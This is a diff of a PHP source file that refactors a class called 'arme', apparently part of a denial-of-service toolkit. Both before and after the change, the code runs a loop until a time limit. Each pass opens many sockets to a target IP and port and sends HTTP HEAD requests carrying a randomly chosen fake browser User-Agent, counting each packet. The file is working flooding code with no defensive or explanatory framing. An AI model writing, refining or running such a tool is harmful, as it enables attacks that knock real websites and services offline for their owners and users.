@@ -1,15 +1,20 @@
 <?php
-class arme extends attack{
-	function __construct($socketn, $lenght, $timedout, $ip, $srcip, $port, $exec_time) {
-		$this->setSocketn($socketn);
-		$this->setLenght($lenght);
-		$this->setTimedout($timedout);
-		$this->setIp($ip);
-		$this->setSrcip($srcip);
-		$this->setPort($port);
-		$this->setExec_time($exec_time);
+include_once "../header.php";
+class arme{
+	public $ip;
+	public $port;
+	public $timedout;
+	public $socketn;
+	public $max_time;
+	public function __construct($ip, $port, $timedout, $socketn, $max_time) {
+		$this->ip = $ip;
+		$this->port = $port;
+		$this->timedout = $timedout;
+		$this->socketn = $socketn;
+		$this->max_time = $max_time;
+
 	}
-	function arme($ip, $port, $timedout, $starttime, $socketn, $max_time, $exec_time){ 							//ARME
+	public function start(){
 		$armetomb=array(
 		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
@@ -59,32 +64,29 @@ class arme extends attack{
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
 		"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 		"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1");
-		
+		$packet = 0;
 		while(1){
-			try{ 
-						if(time() > $max_time){
-							output($packets, $starttime, $exec_time, $lenght);
-							break; 
-						}
+			if(time() >= $this->max_time){
+				return $packet;
+				break; 
+			}
 			
-				$rand=rand(0, 47);
-				for($i=0;$i<=$socketn;$i++){
-					$fp[$i]=fsockopen($ip,$port,$errno,$errstr,$timedout);
-					$out="HEAD / HTTP/1.1\r\n";
-					$out.="Host: ".$ip."\r\n";
-					$out.="User-Agent: ".$armetomb[$rand]."\r\n";
-					$out.= "Connection: keep-alive\r\n";
-					$out.= "\r\n";
-					$packets++; 
-					fwrite($fp[$i],$out);
-				}
-				for($j=0;$j<=$socketn;$j++){
-					fclose($fp[$j]);
-				}
-			}catch (Exception $e){
-				echo $e;
+			$rand=rand(0, 47);
+			for($i=0;$i<=$this->socketn;$i++){
+				$fp[$i]=fsockopen($this->ip,$this->port,$errno,$errstr,$this->timedout);
+				$out="HEAD / HTTP/1.1\r\n";
+				$out.="Host: ".$this->ip."\r\n";
+				$out.="User-Agent: ".$armetomb[$rand]."\r\n";
+				$out.= "Connection: keep-alive\r\n";
+				$out.= "\r\n";
+				$packet++;
+				fwrite($fp[$i],$out);
+			}
+			for($j=0;$j<=$this->socketn;$j++){
+				fclose($fp[$j]);
 			}
 		}
 		
 	}
+
 }
